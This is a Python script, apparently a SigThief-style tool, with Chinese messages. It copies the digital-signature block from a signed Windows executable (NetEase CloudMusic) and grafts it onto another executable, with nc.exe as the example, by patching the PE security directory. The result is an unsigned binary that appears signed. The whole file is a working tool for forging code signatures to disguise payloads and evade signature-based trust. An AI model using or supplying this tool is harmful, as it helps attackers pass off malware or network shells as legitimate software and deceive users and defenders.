import pefile
import os
import shutil
import io
import struct
import optparse
from asn1crypto import cms
from cryptography import x509
from cryptography.hazmat.backends import default_backend

def isexisfile(filepath):
    if os.path.exists(filepath):
        return filepath
    else:
        print("[-] 文件不存在:{}".format(filepath))
        exit(1)

def getpeinfo(path):
    data=pefile.PE(path)
    IMAGE_DIRECTORY_ENTRY_SECURITY=data.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_SECURITY"]]
    virtualaddress=IMAGE_DIRECTORY_ENTRY_SECURITY.VirtualAddress
    size=IMAGE_DIRECTORY_ENTRY_SECURITY.Size
    data.close()
    return (virtualaddress,size)

def getcert(path):
    (virtualaddress, size)=getpeinfo(path)
    if virtualaddress!=0:
        print("Virtualaddress:{} size:{}".format(virtualaddress,size))
        data=open(path,"rb")
        data.seek(virtualaddress)
        thesig=data.read(size)
        signature=cms.ContentInfo.load(thesig[8:])
        for cert in signature["content"]["certificates"]:
            parsed_cert = x509.load_der_x509_certificate(cert.dump(), default_backend())
            print(parsed_cert)
        outname=path.split(os.sep)[-1]+"_sig"
        output=open(outname,"wb")
        output.write(thesig)
        output.close()
        print("Save file:{}".format(outname))
    else:
        print("[-] PE没有数字签名")

def certoutexe(path,cert_path):
    certdata=open(cert_path,"rb").read()
    pe=pefile.PE(path)
  #  print(pe)
    IMAGE_DIRECTORY_ENTRY_SECURITY = pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_SECURITY"]]
    offset=int(IMAGE_DIRECTORY_ENTRY_SECURITY.__file_offset__)
    pe.close()
    output=path.split(".")[0]+"_output.exe"
    shutil.copy2(path,output)
   # print(dir(IMAGE_DIRECTORY_ENTRY_SECURITY))
    with open(path, 'rb') as g:
        with open(output, 'wb') as f:
            f.write(g.read())
            f.seek(0)
            f.seek(offset, 0)
            f.write(struct.pack("<I", len(open(path, 'rb').read())))
            f.write(struct.pack("<I", len(certdata)))
            f.seek(0, io.SEEK_END)
            f.write(certdata)
    print("save file:{}".format(output))
if __name__ == '__main__':
    path=r"D:\tools\Common\Common2\WangYiYun\cloudmusic.exe"
    cert_path=r"D:\tools\ctf\script\py\cloudmusic.exe_sig"
    addexe_path=r"D:\tools\ctf\ReadTerm\SigThief-master(复制假签名)\nc.exe"
    #print("PE PATH:{}".format(path))
    #getcert(path)
  #  certoutexe(addexe_path,cert_path)
    parser=optparse.OptionParser()
    parser.add_option("-f",dest="file",help="PE文件")
    parser.add_option("-o",dest="out",action="store_true",help="导出cert文件")
    parser.add_option("-c",dest="cert_path",help="指定cert文件写入到PE（伪造假签名）")
    (option,args)=parser.parse_args()
    if option.file and option.out:
        file=option.file
        if isexisfile(file):
            print("[导出数字签名]")
            getcert(file)
    elif option.file and option.cert_path:
        print("[PE伪造数字签名]")
        certoutexe(option.file,option.cert_path)
    else:
        print('''python weizao.py -f "cloudmusic.exe" -o #导出数字签名\npython weizao.py -f "nc.exe" -c launcher.exe_sig #伪造数字签名''')
        parser.print_help()



